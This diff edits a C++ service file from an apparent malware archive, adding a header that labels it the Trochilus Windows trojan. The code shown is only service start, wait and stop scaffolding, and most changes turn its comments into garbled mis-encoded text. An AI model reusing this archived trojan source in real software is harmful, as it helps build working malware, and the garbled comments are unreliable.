@@ -1,3 +1,14 @@
+/*
+  name      Trochilus
+  type      trojan
+  cve       â€”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     â€”
+ */
 #include "stdafx.h"
 #include "../sa/CSharedSA.h"
 #include "../snapshot/CSnapshotManager.h"
@@ -89,7 +100,7 @@ void MyService::SetExitEvents(const EventList& exitEvents)
 
 void MyService::Run(DWORD argc, LPTSTR * argv)
 {
-	//³õÊ¼»¯
+	//ï¿½ï¿½Ê¼ï¿½ï¿½
 	MyReportStatus(SERVICE_START_PENDING);
 	if (! Init() || ! InitService())
 	{
@@ -99,13 +110,13 @@ void MyService::Run(DWORD argc, LPTSTR * argv)
 	}
 	MyReportStatus(SERVICE_RUNNING);
 
-	//¿ªÊ¼ÔËÐÐ
+	//ï¿½ï¿½Ê¼ï¿½ï¿½ï¿½ï¿½
 	if (! RunRaw())
 	{
 		return;
 	}
 
-	//µÈ´ý½áÊøµÄÐÅºÅÍ¨Öª
+	//ï¿½È´ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Åºï¿½Í¨Öª
 	DWORD dwWait = 0;
 	if (m_exitEventList.size() == 0)
 	{
@@ -133,7 +144,7 @@ void MyService::Run(DWORD argc, LPTSTR * argv)
 		}
 	}
 	
-	//·´³õÊ¼»¯
+	//ï¿½ï¿½ï¿½ï¿½Ê¼ï¿½ï¿½
 	DeinitService(dwWait);
 	MyReportStatus(SERVICE_STOPPED);
 }
